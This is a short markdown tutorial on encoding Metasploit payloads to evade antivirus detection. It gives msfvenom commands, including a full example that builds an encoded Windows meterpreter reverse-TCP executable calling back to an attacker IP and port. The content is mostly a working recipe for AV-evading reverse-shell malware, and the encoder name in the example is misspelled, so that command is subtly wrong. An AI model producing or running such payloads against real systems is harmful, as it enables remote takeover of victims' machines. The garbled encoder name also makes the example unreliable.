# Encoding Metasploit Payloads

- Encoding is important because we are transferring the payload to the target i.e onto the disk, therefore we need to be conscious of Antivirus detection.
- Antivirus detects the malicious payloads based on their signatures 
- Encoding is the process of modifying the payload such that signature differs and therefore evades the AV detection.

List all MSF encoders:
```sh
msfvenom -l encoders
```

Syntax:
```sh
msfvenom -p "PAYLOAD" LHOST="LOCAL IP" LPORT="LOCAL PORT" -i 10 -e "ENCODER NAME" -f exe > Win32.exe
```
`-i` : refers to iteration. Number of times encoding payload
`-e` : Specifying the Encoder name

Example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.143 LPORT=1234 -i 10 -e x86/shikato_ga_nai -f exe > Win32.exe
```
